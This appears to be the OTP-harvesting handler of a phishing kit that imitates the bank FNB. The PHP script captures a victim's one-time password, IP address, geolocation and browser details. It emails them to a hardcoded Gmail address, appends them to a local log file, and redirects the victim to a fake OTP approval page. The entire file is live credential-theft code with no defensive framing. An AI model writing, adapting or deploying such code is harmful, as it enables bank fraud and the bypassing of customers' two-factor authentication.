
<?php

$name = $_POST['otpValue'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];

$message = "=== F N B  O T P 2 ===S T A R T====== \n";
$message .= "OTP 2:: $name \n";
$message .= 	"IP: {$geoplugin->ip}  \n";
$message .= 	"City: {$geoplugin->city}  \n";
$message .= 	"Region: {$geoplugin->region}  \n";
$message .= 	"Country Name: {$geoplugin->countryName}  \n";
$message .= 	"Country Code: {$geoplugin->countryCode}  \n";
$message .= 	"User-Agent: ".$browser."  \n";
$message .= "Date Log  : ".$date."  \n";
$message .= "Time Log  : ".$time." \n";
$message .= "===========END=========================== \n";

 
$email_from = "$_SERVER[REMOTE_ADDR]\n";//<== update the email address
$email_subject = "FNB O T P 2 - 5th LOGIN | [$name] [{$geoplugin->ip}]";
 
$to = "miichlasj@gmail.com";//<== update the email address
$headers = "From: $email_from \r\n";
//Send the email!
mail($to,$email_subject,$email_body,$headers);


//done. redirect to thank-you page.

header("Location: xvciIgY29udGVudD0iI2ZhZmFmYSAiPiA8bWV0YSBjb250ZW50PSIvYW5kcm9pZC1jaHexpiredApprove-OTP-1.htm");

$fp = fopen("fnbmyltsxxxxxxxxx.txt","a");
fputs($fp,$message);
fclose($fp);

   
?>